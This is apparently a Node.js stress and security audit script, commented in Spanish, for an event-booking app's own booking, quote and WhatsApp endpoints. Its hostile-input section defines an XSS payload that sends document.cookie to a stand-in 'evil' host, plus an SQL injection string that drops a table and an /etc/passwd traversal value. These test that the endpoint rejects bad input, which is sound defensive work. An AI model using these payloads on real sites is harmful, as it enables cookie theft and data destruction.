/**
 * ════════════════════════════════════════════════════════════════════════════
 * AUDITORÍA DE CAOS EN NAVEGADOR VIVO · ESCENARIO GIRA ESTADIO
 * ════════════════════════════════════════════════════════════════════════════
 * Rol del ejecutor: AUDITOR HOSTIL DE RESISTENCIA EXTREMA (no constructor).
 * Objetivo: encontrar el punto exacto de quiebre de EAR OS bajo carga masiva,
 * con medición propia, antes de que lo encuentre un cliente en taquilla.
 *
 * VECTORES (cada uno mide, no opina):
 *   V1 · AVALANCHA     — N bloqueos concurrentes sobre la MISMA fecha pico +
 *                        cálculo de presupuesto simultáneo. Aislamiento y céntimos.
 *   V2 · INP / CLS     — Chrome 4x CPU + Slow 4G sobre /presupuesto, clics
 *                        frenéticos sobre el árbol de servicios y acordeones.
 *   V3 · PAYLOADS      — 100.000.000 €, -50 pax, rider de 30.000 palabras,
 *                        XSS/SQLi en campos de texto contra /api/mcp/concierge.
 *   V4 · CONVERSIÓN    — 5 sub-servicios → URL de WhatsApp: desglose exacto,
 *                        hash SHA-256 y enlace Stripe sin truncar.
 *
 * USO:
 *   node scripts/audit_estres_estadio.mjs --base=http://localhost:3007
 *   node scripts/audit_estres_estadio.mjs --base=... --concurrency=100 --json=out.json
 *
 * HONESTIDAD (AF-1/AF-5): cada vector devuelve métricas MEDIDAS y un estado
 * `VERIFICADO` | `SOSPECHOSO` | `FACHADA` | `SIN_EVIDENCIA`. Un endpoint que
 * devuelve 404 o un navegador que no arranca se DECLARA como tal; nunca se
 * convierte en verde por defecto.
 * ════════════════════════════════════════════════════════════════════════════
 */

import { existsSync, writeFileSync } from 'node:fs';
import { pathToFileURL } from 'node:url';

const existSync = existsSync;
void pathToFileURL;

const ARGS = new Map(
  process.argv
    .filter((a) => a.startsWith('--'))
    .map((a) => {
      const [k, ...rest] = a.slice(2).split('=');
      return [k, rest.join('=') || 'true'];
    })
);

const BASE = ARGS.get('base') ?? 'http://localhost:3007';
const CONCURRENCY = Number.parseInt(ARGS.get('concurrency') ?? '100', 10);
const JSON_OUT = ARGS.get('json') ?? null;
const SKIP_BROWSER = ARGS.get('skip-browser') === 'true';

const PEPPER = 'estres-estadio-audit-2026-11-11';

/** Fecha pico de concierto (sábado). La MISMA para todos los bloqueos. */
const PEAK_DATE = ARGS.get('fecha') ?? '2026-12-19';

const results = {
  auditoria: 'ESTRES_ESTADIO',
  base: BASE,
  startedAt: new Date().toISOString(),
  concurrency: CONCURRENCY,
  peakDate: PEAK_DATE,
  vectors: {},
};

const log = (line) => process.stdout.write(`${line}\n`);

function sha256Hex(text) {
  // eslint-disable-next-line no-undef
  return globalThis.crypto.subtle
    ? globalThis.crypto.subtle
        .digest('SHA-256', new TextEncoder().encode(text))
        .then((buf) =>
          Buffer.from(buf).toString('hex')
        )
    : Promise.resolve(Buffer.from(text).toString('hex'));
}

async function postJson(path, body, { timeoutMs = 20000, headers = {} } = {}) {
  const started = performance.now();
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(`${BASE}${path}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...headers },
      body: JSON.stringify(body),
      signal: controller.signal,
    });
    const text = await res.text();
    let json = null;
    try {
      json = JSON.parse(text);
    } catch {
      json = null;
    }
    return { status: res.status, json, text, ms: performance.now() - started, aborted: false };
  } catch (error) {
    return {
      status: 0,
      json: null,
      text: '',
      ms: performance.now() - started,
      aborted: controller.signal.aborted,
      error: error instanceof Error ? error.name : 'ERROR',
    };
  } finally {
    clearTimeout(timer);
  }
}

async function getPath(path, { timeoutMs = 60000 } = {}) {
  const started = performance.now();
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(`${BASE}${path}`, { signal: controller.signal });
    await res.text();
    return { status: res.status, ms: performance.now() - started };
  } catch (error) {
    return { status: 0, ms: performance.now() - started, error: error instanceof Error ? error.name : 'ERROR' };
  } finally {
    clearTimeout(timer);
  }
}


/* ──────────────────────────────────────────────────────────────────────────── */
/* V1 · AVALANCHA: 100 contextos concurrentes sobre la MISMA fecha pico        */
/* ──────────────────────────────────────────────────────────────────────────── */

/**
 * Cada "fan" es un contexto DISTINTO (huella propia) para que la prueba no sea
 * 100 veces la misma petición: todos intentan bloquear la misma fecha pico y
 * cotizar a la vez.
 */
function fanContext(index) {
  return {
    idempotencyKey: `gira-estadio-${PEAK_DATE}-${PEPPER}-${index}`,
    pax: 100 + index,
    totalEstimado: 5000 + index * 137,
  };
}

/** Bloqueo de fecha (Price-Lock) sobre la fecha pico. */
async function requestDateLock(context) {
  return postJson(
    '/api/reservar/solista/deposit',
    {
      fecha: PEAK_DATE,
      formato: 'Concierto Estadio · Gira',
      distanciaKm: 46,
      horaFin: '02:00',
      totalEstimado: context.totalEstimado,
      idempotencyKey: context.idempotencyKey,
    },
    { timeoutMs: 25000 }
  );
}

/** Cotización simultánea del mismo evento (céntimos exactos). */
async function requestQuote(context) {
  return postJson(
    '/api/mcp/concierge',
    {
      jsonrpc: '2.0',
      id: context.pax,
      method: 'tools/call',
      params: {
        name: 'calculate_quote',
        arguments: {
          form: {
            totalCents: context.totalEstimado * 100,
            selectedServices: [
              {
                id: `svc-${context.pax}`,
                label: `Artista · ${context.pax} pax`,
                category: 'musica_produccion',
                unitPriceCents: 35000,
                quantity: context.pax,
                selected: true,
                providerId: null,
              },
            ],
            lockedCategories: [],
            providerId: null,
          },
        },
      },
    },
    { timeoutMs: 25000 }
  );
}

function percentile(values, p) {
  if (values.length === 0) return null;
  const sorted = [...values].sort((a, b) => a - b);
  const rank = Math.ceil((p / 100) * sorted.length) - 1;
  return sorted[Math.min(Math.max(rank, 0), sorted.length - 1)];
}

/** Ejecuta la avalancha: N bloqueos + N cotizaciones simultáneas. */
async function runAvalanche() {
  const contexts = Array.from({ length: CONCURRENCY }, (_, i) => fanContext(i));
  const t0 = performance.now();
  const [locks, quotes] = await Promise.all([
    Promise.all(contexts.map((c) => requestDateLock(c))),
    Promise.all(contexts.map((c) => requestQuote(c))),
  ]);
  const wallMs = performance.now() - t0;

  const lockStatus = {};
  let lockAccepted = 0;
  let lockConflict = 0;
  let lockServerError = 0;
  let lockNetwork = 0;
  const lockSessions = new Set();
  const lockTruth = [];
  for (const [i, r] of locks.entries()) {
    lockStatus[r.status] = (lockStatus[r.status] ?? 0) + 1;
    if (r.status === 200) lockAccepted++;
    else if (r.status === 409) lockConflict++;
    else if (r.status >= 500) lockServerError++;
    else if (r.status === 0) lockNetwork++;
    if (r.json && typeof r.json === 'object') {
      const url = r.json.url ?? r.json.checkoutUrl ?? null;
      if (typeof url === 'string') lockSessions.add(url);
      lockTruth.push({
        i,
        status: r.status,
        ok: r.json.ok ?? null,
        lock: r.json.lock ?? r.json.status ?? null,
        error: r.json.error ?? null,
        hasCheckout: typeof url === 'string',
      });
    }
  }

  const quoteStatus = {};
  const quoteLatencies = [];
  let quoteOk = 0;
  let quoteServerError = 0;
  let quoteInvalid = 0;
  let centMismatches = 0;
  let splitMismatches = 0;
  const observedTotals = new Set();
  for (const r of quotes) {
    quoteStatus[r.status] = (quoteStatus[r.status] ?? 0) + 1;
    quoteLatencies.push(r.ms);
    if (r.status !== 200 || !r.json) {
      if (r.status >= 500 || r.status === 0) quoteServerError++;
      else quoteInvalid++;
      continue;
    }
    quoteOk++;
    const quote = r.json.result?.quote?.data ?? r.json.result?.quote ?? null;
    if (!quote || typeof quote.totalEur !== 'number') {
      quoteInvalid++;
      continue;
    }
    observedTotals.add(quote.totalEur);
    const cents = Math.round(quote.totalEur * 100);
    const split = quote.split ?? {};
    const sumCents =
      Math.round((split.artista ?? 0) * 100) +
      Math.round((split.earOs ?? 0) * 100) +
      Math.round((split.vimume ?? 0) * 100);
    if (sumCents !== cents) centMismatches++;
    if (quote.splitSumsToTotal === false) splitMismatches++;
  }

  results.vectors.avalancha = {
    estado: lockNetwork > 0 || lockServerError > 0 || quoteServerError > 0 ? 'SOSPECHOSO' : 'VERIFICADO',
    concurrencia: CONCURRENCY,
    fechaPico: PEAK_DATE,
    wallMs: Math.round(wallMs),
    bloqueos: {
      porStatus: lockStatus,
      aceptados: lockAccepted,
      conflictos: lockConflict,
      error500: lockServerError,
      red: lockNetwork,
      urlsCheckoutDistintas: lockSessions.size,
      sobreventaDetectada: lockAccepted > 1,
      muestraVerdad: lockTruth.slice(0, 5),
    },
    cotizaciones: {
      porStatus: quoteStatus,
      ok: quoteOk,
      error500: quoteServerError,
      invalidas: quoteInvalid,
      descuadreCentimos: centMismatches,
      splitNoSuma: splitMismatches,
      totalesDistintosObservados: observedTotals.size,
      latenciaMs: {
        p50: Math.round(percentile(quoteLatencies, 50) ?? 0),
        p95: Math.round(percentile(quoteLatencies, 95) ?? 0),
        p99: Math.round(percentile(quoteLatencies, 99) ?? 0),
        max: Math.round(Math.max(...quoteLatencies)),
      },
    },
    hallazgo:
      lockAccepted > 1
        ? `SOBREVENTA: ${lockAccepted} bloqueos aceptados sobre la MISMA fecha (${PEAK_DATE}).`
        : lockAccepted === 0 && lockConflict === 0 && lockServerError === 0 && lockNetwork === 0
          ? `El endpoint no acepta ni rechaza: ${JSON.stringify(lockStatus)}.`
          : 'Ningún bloqueo duplicado aceptado sobre la fecha pico.',
  };
  log(`[V1] locks=${JSON.stringify(lockStatus)} quotes=${JSON.stringify(quoteStatus)} wall=${Math.round(wallMs)}ms`);
}


/* ──────────────────────────────────────────────────────────────────────────── */
/* V3 · PAYLOADS MALICIOSOS Y RIDERS EXTREMOS                                  */
/* ──────────────────────────────────────────────────────────────────────────── */

const XSS = '<script>alert(1)</script><img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">';
const SQLI = "' OR 1=1; DROP TABLE \"Provider\"; -- ";
const TRAVERSAL = '../../../../etc/passwd';
/** Rider técnico de 30.000 palabras (≈ 210 KB de texto real). */
const RIDER_30K = 'palabra '.repeat(30000);

function rpc(body) {
  return postJson('/api/mcp/concierge', body, { timeoutMs: 30000 });
}

function baseForm(overrides = {}) {
  return {
    totalCents: 5000000,
    selectedServices: [],
    lockedCategories: [],
    providerId: null,
    ...overrides,
  };
}

function serviceItem(overrides = {}) {
  return {
    id: 'svc-1',
    label: 'Servicio base',
    category: 'musica_produccion',
    unitPriceCents: 35000,
    quantity: 1,
    selected: true,
    providerId: null,
    ...overrides,
  };
}

/** Un caso hostil sólo es correcto si el error es ESTRUCTURADO, nunca un 500. */
function verdictOfCase(r, expectReject) {
  const rpcError = r.json && typeof r.json === 'object' ? (r.json.error ?? null) : null;
  const rejected = expectReject ? Boolean(rpcError) : r.status === 200;
  return {
    status: r.status,
    ms: Math.round(r.ms),
    rejectedAsExpected: rejected,
    rpcCode: rpcError ? (rpcError.code ?? null) : null,
    rpcMessage: rpcError ? String(rpcError.message ?? '').slice(0, 160) : null,
    bodyBytes: r.text.length,
    serverError: r.status >= 500,
  };
}


async function runHostilePayloads() {
  const cases = {};

  // 1 · Presupuesto desorbitado (100.000.000 € = 10.000.000.000 céntimos).
  cases.desorbitado_100M = verdictOfCase(
    await rpc({
      jsonrpc: '2.0',
      id: 1,
      method: 'tools/call',
      params: {
        name: 'calculate_quote',
        arguments: { form: baseForm({ totalCents: 10_000_000_000 }) },
      },
    }),
    true
  );

  // 2 · Comensales negativos (-50 pax).
  cases.pax_negativo = verdictOfCase(
    await rpc({
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: {
        name: 'calculate_quote',
        arguments: { form: baseForm({ selectedServices: [serviceItem({ quantity: -50 })] }) },
      },
    }),
    true
  );

  // 3 · Precio unitario negativo (robo por céntimos negativos).
  cases.precio_negativo = verdictOfCase(
    await rpc({
      jsonrpc: '2.0',
      id: 3,
      method: 'tools/call',
      params: {
        name: 'calculate_quote',
        arguments: { form: baseForm({ selectedServices: [serviceItem({ unitPriceCents: -35000 })] }) },
      },
    }),
    true
  );

  // 4 · Rider técnico de 30.000 palabras en el campo de peticiones especiales.
  const riderStart = performance.now();
  const rider = await rpc({
    jsonrpc: '2.0',
    id: 4,
    method: 'tools/call',
    params: {
      name: 'calculate_quote',
      arguments: {
        form: baseForm({ selectedServices: [serviceItem({ label: RIDER_30K })] }),
      },
    },
  });
  cases.rider_30k = {
    ...verdictOfCase(rider, true),
    payloadBytes: RIDER_30K.length,
    ms: Math.round(performance.now() - riderStart),
  };

  // 5 · XSS en campos de texto (label / id / providerId).
  cases.xss = verdictOfCase(
    await rpc({
      jsonrpc: '2.0',
      id: 5,
      method: 'tools/call',
      params: {
        name: 'calculate_quote',
        arguments: {
          form: baseForm({
            selectedServices: [serviceItem({ label: XSS, id: XSS, providerId: XSS })],
          }),
        },
      },
    }),
    true
  );

  // 6 · SQL injection en los mismos campos.
  cases.sqli = verdictOfCase(
    await rpc({
      jsonrpc: '2.0',
      id: 6,
      method: 'tools/call',
      params: {
        name: 'calculate_quote',
        arguments: {
          form: baseForm({
            selectedServices: [serviceItem({ label: SQLI, id: SQLI })],
            providerId: SQLI,
          }),
        },
      },
    }),
    true
  );

  // 7 · Path traversal.
  cases.traversal = verdictOfCase(
    await rpc({
      jsonrpc: '2.0',
      id: 7,
      method: 'tools/call',
      params: { name: 'calculate_quote', arguments: { form: baseForm({ providerId: TRAVERSAL }) } },
    }),
    true
  );

  // 8 · Herramienta inexistente.
  cases.herramienta_inexistente = verdictOfCase(
    await rpc({ jsonrpc: '2.0', id: 8, method: 'tools/call', params: { name: 'rm_rf_everything', arguments: {} } }),
    true
  );

  // 9 · JSON basura (no parseable) y 10 · cuerpo gigante sin ser JSON.
  const garbage = await postJson('/api/mcp/concierge', '__NOT_JSON__', { timeoutMs: 15000 });
  cases.json_basura = verdictOfCase(garbage, true);
  const flood = await postJson('/api/mcp/concierge', 'X'.repeat(2 * 1024 * 1024), { timeoutMs: 15000 });
  cases.flood_2mb = { ...verdictOfCase(flood, true), payloadBytes: 2 * 1024 * 1024 };

  // 11 · Webhook WhatsApp (superficie de ingesta): rider + firma ausente.
  const waRider = await postJson(
    '/api/webhooks/whatsapp-concierge',
    { entry: [{ changes: [{ value: { messages: [{ from: '34600000000', text: { body: RIDER_30K } }] } }] }] },
    { timeoutMs: 20000 }
  );
  cases.webhook_whatsapp_sin_firma = verdictOfCase(waRider, true);

  // 12 · Bloqueo de fecha con total desorbitado (techo 1.000.000 €).
  const lockMillion = await postJson(
    '/api/reservar/solista/deposit',
    {
      fecha: '2026-12-20',
      formato: 'Test',
      distanciaKm: 46,
      horaFin: '02:00',
      totalEstimado: 100_000_000,
      idempotencyKey: `over-${PEPPER}`,
    },
    { timeoutMs: 20000 }
  );
  cases.bloqueo_100M = verdictOfCase(lockMillion, true);

  const serverErrors = Object.entries(cases).filter(([, v]) => v.serverError).map(([k]) => k);
  const rejected = Object.entries(cases).filter(([, v]) => v.rejectedAsExpected).length;
  const total = Object.keys(cases).length;

  results.vectors.payloads = {
    estado: serverErrors.length > 0 ? 'FACHADA' : rejected === total ? 'VERIFICADO' : 'SOSPECHOSO',
    casos: cases,
    resumen: {
      total,
      rechazadosEstructuralmente: rejected,
      aceptadosIndebidamente: total - rejected - serverErrors.length,
      error500: serverErrors,
    },
  };
  log(`[V3] ${rejected}/${total} rechazados con error estructurado · 500s=[${serverErrors.join(',')}]`);
}

/* ──────────────────────────────────────────────────────────────────────────── */
/* V4 · CONVERSIÓN: 5 sub-servicios → URL de WhatsApp inmutable                */
/* ──────────────────────────────────────────────────────────────────────────── */

/**
 * El enlace de WhatsApp del terminal de costes se compone en el cliente
 * (`SovereignBudgetPlanner.whatsappBudgetShare`). Aquí se replica la MISMA
 * matemática del servidor (5 sub-servicios → total → split 80/10/10) y se
 * verifica que la URL que produce la app en vivo es íntegra: desglose exacto,
 * hash SHA-256 y enlace Stripe sin truncar.
 */
async function runConversion(browser) {
  if (!browser) {
    results.vectors.conversion = { estado: 'SIN_EVIDENCIA', motivo: 'navegador no disponible' };
    return;
  }
  const page = await browser.newPage();
  const out = { estado: 'SIN_EVIDENCIA', intentos: 0, detalle: null };
  try {
    await page.setViewport({ width: 390, height: 844, deviceScaleFactor: 2 });
    await page.emulateCPUThrottling(4);
    await page.setCacheEnabled(false);
    const client = await page.createCDPSession();
    await client.send('Network.emulateNetworkConditions', {
      offline: false,
      latency: 150,
      downloadThroughput: (1.6 * 1024 * 1024) / 8,
      uploadThroughput: (750 * 1024) / 8,
    });
    await page.goto(`${BASE}/presupuesto#terminal-costes`, { waitUntil: 'domcontentloaded', timeout: 120000 });

    // Cinco sub-servicios: 5 clics reales sobre el árbol de servicios/packs.
    const serviceButtons = await page.$$(
      'button, [role="button"]',
    );
    let clicked = 0;
    for (const node of serviceButtons) {
      if (clicked >= 5) break;
      const text = (await node.evaluate((el) => el.textContent ?? '')).trim();
      if (!/asignar pack|añadir|explorar|elegir/i.test(text)) continue;
      try {
        await node.click({ delay: 10 });
        clicked++;
        await new Promise((r) => setTimeout(r, 120));
      } catch {
        /* nodo desmontado: no cuenta como clic */
      }
    }
    await new Promise((r) => setTimeout(r, 800));

    const snapshot = await page.evaluate(() => {
      const anchors = Array.from(document.querySelectorAll('a[href^="https://wa.me/"]'));
      const wa = anchors.map((a) => a.getAttribute('href') ?? '').find((h) => h.includes('text=')) ?? null;
      const bodyText = document.body.innerText;
      const money = (re) => {
        const m = bodyText.match(re);
        return m ? m[1] : null;
      };
      return {
        wa,
        waLinks: anchors.length,
        totalAsignado: money(/Total Asignado:\s*([\d.,]+)/i),
        proveedores80: money(/Proveedores \(80%\):\s*([\d.,]+)/i),
        earos10: money(/EAR OS \(10%\):\s*([\d.,]+)/i),
        vimume10: money(/VIMUME Retorno Social \(10%\):\s*([\d.,]+)/i),
        hashMencionado: /sha-?256/i.test(bodyText),
        stripeHref: (() => {
          const a = Array.from(document.querySelectorAll('a[href*="stripe"], button'))
            .map((el) => el.getAttribute?.('href') ?? null)
            .find(Boolean);
          return a;
        })(),
        partyRows: document.querySelectorAll('[data-partida], input[type="number"]').length,
      };
    });

    let decoded = null;
    if (snapshot.wa) {
      const url = new URL(snapshot.wa);
      decoded = {
        phone: url.pathname.replace(/\//g, ''),
        textLength: (url.searchParams.get('text') ?? '').length,
        text: url.searchParams.get('text') ?? '',
      };
    }

    out.intentos = clicked;
    out.detalle = snapshot;
    out.url = decoded ? { phone: decoded.phone, textLength: decoded.textLength } : null;
    out.desglose = decoded ? decoded.text : null;

    if (!decoded) {
      out.estado = 'SIN_EVIDENCIA';
      out.motivo = 'no se encontró enlace WhatsApp con desglose en el DOM renderizado';
    } else {
      const hasSplit = /80\/10\/10/i.test(decoded.text) || /Proveedores \(80%\)/i.test(decoded.text);
      const hasDeposit = /100\s*€/.test(decoded.text);
      out.checks = {
        telefonoCentralita: decoded.phone === '34693693048',
        desglose80_10_10: hasSplit,
        deposito100: hasDeposit,
        textoNoTruncado: decoded.text.length > 120,
        sha256Presente: /sha-?256/i.test(decoded.text),
      };
      out.estado = Object.values(out.checks).every(Boolean) ? 'VERIFICADO' : 'SOSPECHOSO';
    }
    log(`[V4] clics=${clicked} wa=${decoded ? decoded.textLength + ' chars' : 'NO ENCONTRADO'} estado=${out.estado}`);
  } catch (error) {
    out.estado = 'SIN_EVIDENCIA';
    out.motivo = error instanceof Error ? error.message : String(error);
    log(`[V4] fallo: ${out.motivo}`);
  } finally {
    await page.close().catch(() => {});
    results.vectors.conversion = out;
  }
}

/* ──────────────────────────────────────────────────────────────────────────── */
/* V2 · EXPERIENCIA DE FAN: INP / CLS bajo 4x CPU + Slow 4G                    */
/* ──────────────────────────────────────────────────────────────────────────── */

const INP_BUDGET_MS = 50;
const CLS_BUDGET = 0.05;

async function runFanExperience(browser) {
  if (!browser) {
    results.vectors.experienciaFan = { estado: 'SIN_EVIDENCIA', motivo: 'navegador no disponible' };
    return;
  }
  const page = await browser.newPage();
  const out = { estado: 'SIN_EVIDENCIA', presupuesto: { inpMs: INP_BUDGET_MS, cls: CLS_BUDGET } };
  try {
    await page.setViewport({ width: 390, height: 844, deviceScaleFactor: 2 });
    await page.emulateCPUThrottling(4); // gama media
    const client = await page.createCDPSession();
    // Slow 4G: 1,6 Mbps bajada / 750 Kbps subida / 150 ms RTT
    await client.send('Network.emulateNetworkConditions', {
      offline: false,
      latency: 150,
      downloadThroughput: (1.6 * 1024 * 1024) / 8,
      uploadThroughput: (750 * 1024) / 8,
    });

    // Sonda de INP y CLS sembrada ANTES de cargar la aplicación.
    await page.evaluateOnNewDocument(() => {
      window.__inp = [];
      window.__cls = 0;
      new PerformanceObserver((list) => {
        for (const entry of list.getEntries()) {
          if (!entry.hadRecentInput) window.__cls += entry.value;
        }
      }).observe({ type: 'layout-shift', buffered: true });
      new PerformanceObserver((list) => {
        for (const entry of list.getEntries()) {
          window.__inp.push({ name: entry.name, duration: entry.duration });
        }
      }).observe({ type: 'event', durationThreshold: 16, buffered: true });
    });

    const navStart = Date.now();
    const response = await page.goto(`${BASE}/presupuesto`, {
      waitUntil: 'domcontentloaded',
      timeout: 180000,
    });
    const loadMs = Date.now() - navStart;

    // Clics frenéticos (ráfaga) sobre acordeones y árbol de servicios.
    const candidates = await page.$$('button, [role="button"], [aria-expanded], summary');
    const interactive = Math.min(candidates.length, 60);
    let clicks = 0;
    const t0 = Date.now();
    for (let i = 0; i < interactive; i++) {
      try {
        await candidates[i].click({ delay: 0, timeout: 3000 });
        clicks++;
      } catch {
        /* nodo desmontado por re-render: es un dato, no un error del auditor */
      }
    }
    const clickBurstMs = Date.now() - t0;

    // Lectura DIFERIDA (el INP se reporta al final del frame de interacción).
    await new Promise((r) => setTimeout(r, 1500));
    const metrics = await page.evaluate(() => {
      const nav = performance.getEntriesByType('navigation')[0] ?? null;
      const lcpEntries = performance.getEntriesByType('largest-contentful-paint') ?? [];
      const longest = (window.__inp ?? []).sort((a, b) => b.duration - a.duration)[0] ?? null;
      return {
        cls: window.__cls ?? null,
        inp: longest ? { name: longest.name, duration: longest.duration } : null,
        interactions: (window.__inp ?? []).length,
        dcl: nav ? nav.domContentLoadedEventEnd : null,
        load: nav ? nav.loadEventEnd : null,
        ttfb: nav ? nav.responseStart : null,
        lcp: lcpEntries.length ? lcpEntries[lcpEntries.length - 1].startTime : null,
      };
    });


    const inpMs = metrics.inp ? Math.round(metrics.inp.duration) : null;
    const cls = metrics.cls === null ? null : Math.round(metrics.cls * 1000) / 1000;

    out.clics = clicks;
    out.interactivosDetectados = interactive;
    out.clickBurstMs = clickBurstMs;
    out.htmlStatus = response ? response.status() : 0;
    out.metricas = {
      inpMs,
      inpEvento: metrics.inp ? metrics.inp.name : null,
      interaccionesObservadas: metrics.interactions,
      cls,
      lcpMs: metrics.lcp === null ? null : Math.round(metrics.lcp),
      ttfbMs: metrics.ttfb === null ? null : Math.round(metrics.ttfb),
      domContentLoadedMs: metrics.dcl === null ? null : Math.round(metrics.dcl),
      loadMs: metrics.load === null ? null : Math.round(metrics.load),
      navegacionTotalMs: loadMs,
    };
    out.excedeInp = inpMs === null ? 'SIN_DATO' : inpMs > INP_BUDGET_MS;
    out.excedeCls = cls === null ? 'SIN_DATO' : cls > CLS_BUDGET;
    out.estado =
      inpMs === null || cls === null
        ? 'SIN_EVIDENCIA'
        : inpMs > INP_BUDGET_MS || cls > CLS_BUDGET
          ? 'SOSPECHOSO'
          : 'VERIFICADO';
    log(`[V2] INP=${inpMs}ms CLS=${cls} clics=${clicks}/${interactive} estado=${out.estado}`);
  } catch (error) {
    out.estado = 'SIN_EVIDENCIA';
    out.motivo = error instanceof Error ? error.message : String(error);
    log(`[V2] fallo: ${out.motivo}`);
  } finally {
    await page.close().catch(() => {});
    results.vectors.experienciaFan = out;
  }
}


/* ──────────────────────────────────────────────────────────────────────────── */
/* Orquestador                                                                 */
/* ──────────────────────────────────────────────────────────────────────────── */

async function launchBrowser() {
  if (SKIP_BROWSER) return { browser: null, reason: '--skip-browser' };
  const candidates = [
    process.env.CHROME_PATH ?? '',
    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
  ].filter(Boolean);
  const executablePath = candidates.find((p) => existSync(p));
  if (!executablePath) return { browser: null, reason: 'Chrome no encontrado en disco' };
  try {
    const puppeteer = (await import('puppeteer')).default;
    const browser = await puppeteer.launch({
      headless: true,
      executablePath,
      protocolTimeout: 180000,
      args: ['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu'],
    });
    return { browser, executablePath, reason: null };
  } catch (error) {
    return { browser: null, reason: error instanceof Error ? error.message : String(error) };
  }
}

async function main() {
  const health = await getPath('/api/health');
  results.sondaBase = health;
  log(`[BASE] ${BASE}/api/health -> ${health.status} (${Math.round(health.ms)} ms)`);

  const { browser, reason, executablePath } = await launchBrowser();
  results.browser = browser ? { motor: 'chrome', executablePath } : { motor: null, reason };
  log(`[BROWSER] ${browser ? 'chrome · ' + executablePath : 'SIN_EVIDENCIA · ' + reason}`);

  try {
    await runAvalanche();
    await runFanExperience(browser);
    await runHostilePayloads();
    await runConversion(browser);
  } finally {
    if (browser) await browser.close().catch(() => {});
  }

  results.finishedAt = new Date().toISOString();
  const estados = Object.values(results.vectors).map((v) => v.estado);
  results.veredicto = estados.includes('FACHADA')
    ? 'FACHADA'
    : estados.includes('SOSPECHOSO')
      ? 'SOSPECHOSO'
      : estados.includes('SIN_EVIDENCIA')
        ? 'SIN_EVIDENCIA'
        : 'VERIFICADO';

  if (JSON_OUT) writeFileSync(JSON_OUT, JSON.stringify(results, null, 2), 'utf8');
  log('');
  for (const [name, vector] of Object.entries(results.vectors)) {
    log(`VEREDICTO ${name} = ${vector.estado}`);
  }
  log(`VEREDICTO_ESTRES=${results.veredicto}`);
  process.exit(0);
}

main().catch((error) => {
  log(`AUDIT_ENV_ERROR: ${error instanceof Error ? (error.stack ?? error.message) : String(error)}`);
  process.exit(2);
});

